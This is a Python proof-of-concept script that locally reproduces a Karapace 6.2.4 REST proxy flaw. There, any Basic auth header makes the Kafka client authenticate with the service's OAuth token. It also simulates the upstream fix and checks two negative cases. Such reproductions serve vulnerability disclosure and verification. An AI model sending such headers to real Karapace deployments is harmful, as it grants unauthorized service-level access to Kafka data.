#!/usr/bin/env python3
"""C69 deterministic PoC — Karapace 6.2.4 REST proxy Basic→service OAuth token inheritance.

Harmless / no network. Reconstructs the exact config mutation in:
  kafka_rest_apis/__init__.py::KafkaRest.get_user_proxy (tag 6.2.4 / 09cba53)
  kafka_rest_apis/authentication.py::get_auth_config_from_header
  kafka_rest_apis/authentication.py::get_kafka_client_auth_parameters_from_config

FACT: with rest_authorization=true and service sasl_mechanism=OAUTHBEARER + sasl_oauth_token set,
a request with Authorization: Basic <anything> causes the per-user proxy config to keep the
SERVICE sasl_oauth_token and mechanism OAUTHBEARER, so Kafka clients authenticate as the service.
"""
from __future__ import annotations

import base64
import dataclasses
from typing import Any


@dataclasses.dataclass
class Config:
    """Minimal stand-in for karapace.core.config.Config fields used by get_user_proxy."""

    rest_authorization: bool = True
    sasl_bootstrap_uri: str = "kafka:9093"
    bootstrap_uri: str = "kafka:9092"
    security_protocol: str = "SASL_SSL"
    sasl_mechanism: str | None = "OAUTHBEARER"
    sasl_oauth_token: str | None = "SERVICE_STATIC_TOKEN_DO_NOT_LEAK"
    sasl_plain_username: str | None = None
    sasl_plain_password: str | None = None
    _sasl_oauth_token_provider: object | None = None

    def copy(self) -> "Config":
        return Config(**{f.name: getattr(self, f.name) for f in dataclasses.fields(self)})


def get_auth_config_from_header(auth_header: str | None, config: Config) -> dict[str, Any]:
    """Exact control flow from authentication.py @ 6.2.4 (Bearer / Basic branches)."""
    if auth_header is None:
        raise PermissionError("unauthorized")
    token_type, _, token = auth_header.partition(" ")
    if token_type == "Bearer":
        return {"sasl_mechanism": "OAUTHBEARER", "sasl_oauth_token": token}
    if token_type == "Basic":
        raw = base64.b64decode(token).decode()
        login, _, password = raw.partition(":")
        sasl_mechanism = config.sasl_mechanism
        if sasl_mechanism is None:
            sasl_mechanism = "PLAIN"
        return {
            "sasl_mechanism": sasl_mechanism,
            "sasl_plain_username": login,
            "sasl_plain_password": password,
        }
    raise PermissionError("unauthorized")


def build_user_proxy_config(service: Config, auth_header: str) -> Config:
    """Exact mutation sequence from KafkaRest.get_user_proxy @ 6.2.4 when rest_authorization."""
    assert service.rest_authorization
    auth_config = get_auth_config_from_header(auth_header, service)
    config = service.copy()
    config.bootstrap_uri = config.sasl_bootstrap_uri
    config.security_protocol = (
        "SASL_SSL" if config.security_protocol in ("SSL", "SASL_SSL") else "SASL_PLAINTEXT"
    )
    config.sasl_mechanism = auth_config["sasl_mechanism"]
    if "sasl_oauth_token" in auth_config:
        config.sasl_oauth_token = auth_config["sasl_oauth_token"]
    else:
        config.sasl_plain_username = auth_config["sasl_plain_username"]
        config.sasl_plain_password = auth_config["sasl_plain_password"]
        # NOTE: config.sasl_oauth_token is NOT cleared — still SERVICE token
    return config


@dataclasses.dataclass
class SimpleOauthTokenProvider:
    _token: str = dataclasses.field(repr=False)

    def token_with_expiry(self, _config: str | None = None):
        return (self._token, None)


def get_kafka_client_auth_parameters_from_config(config: Config) -> dict[str, Any]:
    """Exact branch from authentication.py @ 6.2.4."""
    if config.sasl_mechanism == "OAUTHBEARER":
        assert config.sasl_oauth_token is not None
        return {
            "sasl_mechanism": config.sasl_mechanism,
            "sasl_oauth_token_provider": SimpleOauthTokenProvider(config.sasl_oauth_token),
        }
    return {
        "sasl_mechanism": config.sasl_mechanism,
        "sasl_plain_username": config.sasl_plain_username,
        "sasl_plain_password": config.sasl_plain_password,
    }


def build_user_proxy_config_fixed(service: Config, auth_header: str) -> Config:
    """Simulated 1aadbea fix: clear oauth; reject Basic on OAUTHBEARER."""
    auth_config = get_auth_config_from_header(auth_header, service)
    config = service.copy()
    config.bootstrap_uri = config.sasl_bootstrap_uri
    config.security_protocol = (
        "SASL_SSL" if config.security_protocol in ("SSL", "SASL_SSL") else "SASL_PLAINTEXT"
    )
    config.sasl_mechanism = auth_config["sasl_mechanism"]
    config.sasl_oauth_token = None
    config._sasl_oauth_token_provider = None
    if "sasl_oauth_token" in auth_config:
        config.sasl_oauth_token = auth_config["sasl_oauth_token"]
    else:
        if config.sasl_mechanism == "OAUTHBEARER":
            raise PermissionError("Bearer token required")
        config.sasl_plain_username = auth_config["sasl_plain_username"]
        config.sasl_plain_password = auth_config["sasl_plain_password"]
    return config


def main() -> None:
    service = Config()
    basic = "Basic " + base64.b64encode(b"attacker:not-a-real-password").decode()
    bearer = "Bearer USER_JWT_TOKEN"

    user_cfg = build_user_proxy_config(service, basic)
    kafka_params = get_kafka_client_auth_parameters_from_config(user_cfg)
    token, _ = kafka_params["sasl_oauth_token_provider"].token_with_expiry()

    assert user_cfg.sasl_mechanism == "OAUTHBEARER", user_cfg.sasl_mechanism
    assert user_cfg.sasl_oauth_token == "SERVICE_STATIC_TOKEN_DO_NOT_LEAK"
    assert user_cfg.sasl_plain_username == "attacker"
    assert token == "SERVICE_STATIC_TOKEN_DO_NOT_LEAK"
    print("[+] VULN: Basic auth -> Kafka OAUTHBEARER uses SERVICE token")
    print(f"    mechanism={kafka_params['sasl_mechanism']}")
    print(f"    token_used={token!r}")
    print(f"    plain_username_set_but_ignored={user_cfg.sasl_plain_username!r}")

    bearer_cfg = build_user_proxy_config(service, bearer)
    bearer_params = get_kafka_client_auth_parameters_from_config(bearer_cfg)
    btoken, _ = bearer_params["sasl_oauth_token_provider"].token_with_expiry()
    assert btoken == "USER_JWT_TOKEN"
    print("[+] NEGATIVE: Bearer auth -> Kafka uses caller JWT (expected)")
    print(f"    token_used={btoken!r}")

    scram_service = Config(sasl_mechanism="SCRAM-SHA-256", sasl_oauth_token=None)
    scram_cfg = build_user_proxy_config(scram_service, basic)
    scram_params = get_kafka_client_auth_parameters_from_config(scram_cfg)
    assert scram_params["sasl_mechanism"] == "SCRAM-SHA-256"
    assert scram_params["sasl_plain_username"] == "attacker"
    assert "sasl_oauth_token_provider" not in scram_params
    print("[+] NEGATIVE: SCRAM service + Basic -> uses caller plain creds (expected)")

    try:
        build_user_proxy_config_fixed(service, basic)
        raise SystemExit("FIX SIMULATION FAILED: Basic should be rejected")
    except PermissionError as e:
        print(f"[+] FIX(1aadbea): Basic on OAUTHBEARER rejected: {e}")

    print("ALL CHECKS PASSED")


if __name__ == "__main__":
    main()
